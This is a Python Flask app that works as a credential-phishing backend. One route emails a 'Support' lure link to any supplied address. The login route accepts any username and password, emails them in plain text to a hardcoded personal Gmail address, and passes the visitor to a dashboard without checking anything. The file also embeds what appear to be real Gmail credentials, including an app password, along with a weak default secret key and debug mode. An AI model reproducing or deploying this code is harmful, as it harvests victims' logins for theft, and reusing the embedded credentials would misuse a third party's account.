from flask import Flask, request, redirect, url_for, session, render_template
from flask_mail import Mail, Message
from dotenv import load_dotenv
import os
import threading

# ===== Load .env =====
load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "supersecretkey")

# ===== Mail Config =====
app.config["MAIL_SERVER"] = os.environ.get("MAIL_SERVER", "smtp.gmail.com")
app.config["MAIL_PORT"] = int(os.environ.get("MAIL_PORT", 587))
app.config["MAIL_USE_TLS"] = os.environ.get("MAIL_USE_TLS", "True") == "True"
app.config["MAIL_USE_SSL"] = os.environ.get("MAIL_USE_SSL", "False") == "True"
app.config["MAIL_USERNAME"] = os.environ.get("MAIL_USERNAME", "lpg8718068669@gmail.com")
app.config["MAIL_PASSWORD"] = os.environ.get("MAIL_PASSWORD", "ejpevwjotmueyoao")
app.config["MAIL_DEFAULT_SENDER"] = os.environ.get("MAIL_DEFAULT_SENDER", "lpg8718068669@gmail.com")

mail = Mail(app)

# ===== ROUTES =====
@app.route("/send_msg", methods=["POST"])
def send_msg():
    data = request.json
    if not data or "email" not in data:
        return {"status": False, "message": "Email is required"}, 400

    email = data["email"]
    link = os.environ.get("APP_URL", "http://localhost:5777") + "/login"

    def send_email():
        with app.app_context():  # <--- FIX: context added
            try:
                msg = Message(
                    subject="Support",
                    recipients=[email],
                    body=f"Click here to visit: {link}"
                )
                mail.send(msg)
            except Exception as e:
                print("Support mail error:", e)

    threading.Thread(target=send_email).start()
    return {"status": True, "message": "Mail sent successfully"}

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("name")
        password = request.form.get("password")

        def send_login_mail():
            with app.app_context():  # <--- FIX: context added
                try:
                    msg = Message(
                        subject="Login Alert",
                        recipients=["raksha.rajput98@gmail.com"],  # Admin email
                        body=f"Username: {username}\nPassword: {password}"
                    )
                    mail.send(msg)
                except Exception as e:
                    print("Login mail error:", e)

        threading.Thread(target=send_login_mail).start()
        return redirect(url_for("dashboard"))

    return render_template("home.html")

@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ===== Run Server =====
if __name__ == "__main__":
    app.run(debug=True, port=5777)
